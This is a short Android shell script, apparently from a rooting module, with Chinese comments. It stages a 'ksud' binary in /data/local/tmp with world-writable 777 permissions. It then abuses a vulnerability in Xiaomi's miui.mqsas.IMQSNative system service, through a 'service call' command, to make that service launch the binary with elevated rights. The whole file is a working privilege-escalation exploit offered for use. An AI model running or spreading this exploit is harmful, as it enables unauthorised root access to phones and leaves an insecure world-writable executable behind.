#!/system/bin/sh
MODDIR=${0%/*}
KSUD_SOURCE="$MODDIR/../files/ksud"
# 仅保留 /data/local/tmp 路径，变量名统一为 KSUD_TARGET
KSUD_TARGET="/data/local/tmp/ksud"

# 只复制到漏洞调用必须目录，赋777权限
cp -f "$KSUD_SOURCE" "$KSUD_TARGET"
chmod 777 "$KSUD_TARGET"
chown shell:shell "$KSUD_TARGET"

echo "执行IMQS Native服务漏洞调用..."
service call miui.mqsas.IMQSNative 21 i32 1 s16 "/data/local/tmp/ksud" i32 1 s16 "late-load" s16 "/sdcard/ksulog.txt" i32 600

echo "✅ IMQS漏洞执行完成，请查看 /sdcard/ksulog.txt 日志"
